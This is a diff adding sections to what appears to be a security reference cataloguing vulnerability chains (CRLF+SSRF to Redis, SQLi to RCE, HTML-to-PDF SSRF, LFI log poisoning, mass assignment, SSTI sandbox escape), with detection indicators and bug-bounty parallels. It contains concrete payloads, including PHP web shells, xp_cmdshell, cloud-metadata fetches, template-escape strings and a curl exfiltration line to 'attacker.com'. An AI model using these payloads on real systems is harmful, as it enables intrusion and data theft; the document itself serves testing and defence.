@@ -167,6 +167,149 @@ Patterns are bidirectional unless noted — the order of discovery doesn't matte
 
 **Effective severity**: Critical (internal network compromise)
 
+---
+
+### CRLF Injection + SSRF → Redis Command Injection → RCE
+
+**Components**: CRLF injection (CRLF, HEADER-INJ) + Server-side request forgery (SSRF)
+
+**Connection mechanism**: CRLF injection in a URL passed through an SSRF endpoint allows injecting raw Redis/Memcached protocol commands. The SSRF reaches an internal Redis instance, and CRLF sequences break out of the HTTP protocol into Redis commands.
+
+**Combined attack path**:
+1. Identify SSRF endpoint that makes requests to internal services
+2. Inject CRLF characters (`%0d%0a`) into the URL to break out of HTTP request
+3. Inject Redis commands after CRLF: `SET shell "<?php system($_GET['cmd']); ?>"`
+4. Use Redis `CONFIG SET dir /var/www/html` and `CONFIG SET dbfilename shell.php`
+5. Trigger Redis SAVE to write web shell to disk
+6. Access web shell for RCE
+
+**Effective severity**: Critical (RCE via cache protocol injection)
+
+**Detection indicators**: SSRF with URL parameter that does not strip CRLF characters. Internal Redis/Memcached reachable from application server without authentication. Application uses HTTP libraries that do not reject CRLF in URLs.
+
+**Real-world parallels**: GitLab SSRF to Redis RCE (HackerOne #441090, $33,750 bounty). Multiple Shopify and GitHub reports involving CRLF + SSRF chains.
+
+---
+
+### SQL Injection + File Read/Write Privileges → RCE
+
+**Components**: SQL injection (SQLI) + database file system access (FILE privilege, COPY, xp_cmdshell)
+
+**Connection mechanism**: SQL injection with elevated database privileges enables reading or writing files on the database server's filesystem, or direct command execution through database-specific features.
+
+**Combined attack path (MySQL)**:
+1. Exploit SQL injection to confirm FILE privilege: `SELECT LOAD_FILE('/etc/passwd')`
+2. Write web shell via `SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`
+3. Access web shell for RCE
+
+**Combined attack path (PostgreSQL)**:
+1. Exploit SQL injection to execute OS commands: `COPY (SELECT '') TO PROGRAM 'id'`
+2. Or create a PL/Python function for persistent command execution
+3. Exfiltrate via `COPY ... TO PROGRAM 'curl attacker.com/?data=$(command)'`
+
+**Combined attack path (MSSQL)**:
+1. Enable xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`
+2. Execute commands: `EXEC xp_cmdshell 'whoami'`
+3. Establish reverse shell or exfiltrate data
+
+**Effective severity**: Critical (RCE or arbitrary file read/write)
+
+**Detection indicators**: SQL injection exists. Database user has FILE privilege (MySQL), is superuser (PostgreSQL), or is sysadmin (MSSQL). Web root is writable by database process. `xp_cmdshell` is available or can be enabled.
+
+**Real-world parallels**: Common escalation path in CTF competitions and real-world pentests. Multiple HackerOne reports demonstrate SQLi → file write → RCE.
+
+---
+
+### SSRF + PDF/Image Generator → Internal File Read
+
+**Components**: Server-side request forgery (SSRF) + server-side document rendering (PDF, image, HTML-to-PDF)
+
+**Connection mechanism**: Application uses a headless browser or HTML-to-PDF converter (wkhtmltopdf, Puppeteer, WeasyPrint, Chrome headless) to render user-supplied HTML. The renderer fetches resources server-side, acting as an SSRF vector that can read internal files and access internal services.
+
+**Combined attack path**:
+1. Identify PDF/image generation feature that accepts HTML input (invoice generators, report exporters, ticket renderers)
+2. Inject HTML with server-side fetch: `<iframe src="file:///etc/passwd">` or `<img src="http://169.254.169.254/latest/meta-data/">`
+3. Renderer fetches the resource server-side and includes content in the generated document
+4. Download the generated PDF/image to read internal file contents or cloud metadata
+
+**Effective severity**: Critical (internal network access + file read)
+
+**Detection indicators**: Application generates PDFs or images from user-supplied HTML or URLs. Uses wkhtmltopdf, Puppeteer, WeasyPrint, Prince, or Chrome headless. User controls any part of the HTML template (even partial — header, footer, filename, description fields).
+
+**Real-world parallels**: Extremely common in bug bounty programs. Invoice generators, report exporters, and ticket systems are frequent targets. Multiple $10K+ bounties for HTML-to-PDF SSRF.
+
+---
+
+### LFI + Log Poisoning → RCE
+
+**Components**: Local file inclusion (LFI, PATH-TRAV) + log file write with user-controlled content
+
+**Connection mechanism**: LFI allows reading arbitrary files including log files. If the application logs user-controlled data (User-Agent, username, request parameters) without sanitization, an attacker can inject code into the log file and then include it via LFI to achieve code execution.
+
+**Combined attack path**:
+1. Identify LFI vulnerability (e.g., `?page=../../../etc/passwd`)
+2. Determine log file location (e.g., `/var/log/apache2/access.log`, `/var/log/nginx/error.log`)
+3. Send request with PHP payload in User-Agent header: `<?php system($_GET['cmd']); ?>`
+4. Include the log file via LFI: `?page=../../../var/log/apache2/access.log&cmd=id`
+5. PHP engine executes the payload from the log file
+
+**Effective severity**: Critical (RCE from two medium-severity findings)
+
+**Detection indicators**: LFI or path traversal vulnerability exists. Application runs PHP (or other language that executes included files). Log files are readable by the web server process. Application logs user-controlled headers or parameters without sanitization.
+
+**Real-world parallels**: Classic web exploitation technique. Common in legacy PHP applications. Also applies to session file inclusion (`/tmp/sess_<PHPSESSID>`) and `/proc/self/environ` inclusion.
+
+---
+
+### Mass Assignment + Privilege Field → Privilege Escalation
+
+**Components**: Mass assignment (MASS-ASSIGN) + role or privilege field in the data model
+
+**Connection mechanism**: The application binds request parameters directly to model attributes without a whitelist. The data model includes a privilege field (role, is_admin, permissions, access_level) that can be set through mass assignment.
+
+**Combined attack path**:
+1. Identify endpoint that creates or updates user/account objects (registration, profile update, settings)
+2. Inspect the data model or API response for privilege-related fields (role, is_admin, is_staff, permissions, group_id)
+3. Send request with extra parameter: `{"username": "attacker", "email": "a@b.com", "role": "admin"}`
+4. Application binds all parameters including the privilege field
+5. Attacker account now has admin/elevated privileges
+
+**Effective severity**: Critical (privilege escalation to admin)
+
+**Detection indicators**: Application uses mass assignment (ActiveRecord, Django ModelForm without `fields`, Express with body directly to model). Data model has role/privilege fields. No explicit parameter whitelist or strong parameters enforcement.
+
+**Real-world parallels**: GitHub mass assignment incident (2012) — Egor Homakov escalated privileges via mass assignment on public key model. Common in Rails, Django, and Express applications.
+
+---
+
+### SSTI + Sandbox Escape → RCE
+
+**Components**: Server-side template injection (SSTI) + template engine sandbox/restriction bypass
+
+**Connection mechanism**: SSTI allows injecting template syntax that is evaluated server-side. Modern template engines restrict available objects, but MRO (Method Resolution Order) traversal, reflection, and known gadget chains can escape the sandbox to achieve arbitrary code execution.
+
+**Combined attack path (Jinja2/Python)**:
+1. Confirm SSTI: `{{7*7}}` → `49`
+2. Access object class hierarchy: `{{''.__class__.__mro__[1].__subclasses__()}}`
+3. Find subprocess or os module in subclasses
+4. Execute arbitrary commands: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
+
+**Combined attack path (Freemarker/Java)**:
+1. Confirm SSTI: `${7*7}` → `49`
+2. Execute via built-in: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
+3. Or use ObjectConstructor: `${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Runtime").exec("id")}`
+
+**Combined attack path (Twig/PHP)**:
+1. Confirm SSTI: `{{7*7}}` → `49`
+2. Twig 1.x: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
+3. Twig 3.x (with allowed functions): `{{['id']|filter('system')}}`
+
+**Effective severity**: Critical (RCE via template sandbox escape)
+
+**Detection indicators**: User input reaches template rendering. Template engine is Jinja2, Freemarker, Twig, Velocity, Mako, or Pebble. Application uses server-side rendering with dynamic templates. Error messages reveal template engine name/version.
+
+**Real-world parallels**: Uber SSTI (Jinja2 → RCE, HackerOne). Shopify Liquid SSTI. Multiple Freemarker SSTI reports in Java applications. Orange Tsai's template injection research.
+
 ## High-Impact Chains
 
 ### XSS + Session → Session Hijacking
